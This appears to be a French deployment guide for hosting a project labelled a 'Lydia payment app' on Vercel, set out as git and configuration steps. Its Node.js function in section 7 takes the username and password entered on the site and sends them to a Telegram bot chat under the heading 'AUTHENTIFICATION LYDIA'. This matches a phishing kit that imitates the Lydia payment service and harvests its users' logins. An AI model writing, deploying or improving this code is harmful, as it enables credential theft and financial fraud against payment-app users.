# Guide de déploiement sur Vercel

## Étapes pour publier votre projet Lydia sur Vercel

### 1. Prérequis
- Compte GitHub
- Compte Vercel (gratuit sur https://vercel.com)
- Git installé sur votre ordinateur

### 2. Initialiser Git et pousser sur GitHub

```bash
# Allez dans le répertoire du projet
cd "C:\Users\user\Desktop\lydia link\lydia-wero-design"

# Initialiser Git
git init

# Ajouter tous les fichiers
git add .

# Faire un commit initial
git commit -m "Initial commit - Lydia payment app"

# Ajouter votre repository GitHub (remplacez USERNAME et REPO)
git remote add origin https://github.com/USERNAME/lydia-wero-design.git

# Pousser sur GitHub
git branch -M main
git push -u origin main
```

### 3. Connecter à Vercel

1. Allez sur https://vercel.com/new
2. Cliquez sur "Import Git Repository"
3. Connectez votre compte GitHub
4. Sélectionnez le repository `lydia-wero-design`
5. Cliquez sur "Import"

### 4. Configurer les variables d'environnement

Dans Vercel, allez à **Settings** → **Environment Variables** et ajoutez:

```
TELEGRAM_BOT_TOKEN = votre_token
TELEGRAM_CHAT_ID = votre_chat_id
```

### 5. Déployer

- Cliquez sur "Deploy"
- Vercel va construire et publier votre site
- Vous recevrez une URL comme `https://lydia-wero-design.vercel.app`

### 6. Note importante sur l'API PHP

⚠️ **Limitation:** Vercel n'exécute pas PHP nativement. Pour l'API Telegram, vous avez deux options:

**Option A: Créer une fonction Vercel (Node.js)**
Remplacer l'API PHP par une fonction serverless Node.js dans le dossier `/api`

**Option B: Utiliser un service externe**
Garder l'API PHP sur un serveur différent (Heroku, Railway, etc.)

### 7. Exemple de fonction Vercel pour Telegram (Node.js)

Créer `/api/send-telegram.js`:

```javascript
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { identifiant, password } = req.body;
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  const message = `🔐 AUTHENTIFICATION LYDIA\n\n👤 Identifiant: \`${identifiant}\`\n🔑 Mot de passe: \`${password}\`\n⏰ Heure: ${new Date().toLocaleString('fr-FR')}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      throw new Error('Telegram API error');
    }

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}
```

Puis remplacer dans `index.html` et autres fichiers:
```javascript
await fetch('/api/send-telegram', { ... })
```

### 8. Mise à jour depuis votre ordinateur

Après chaque modification:

```bash
git add .
git commit -m "Description des changements"
git push
```

Vercel se redéploiera automatiquement!

---

**Besoin d'aide?** Consultez la documentation Vercel: https://vercel.com/docs
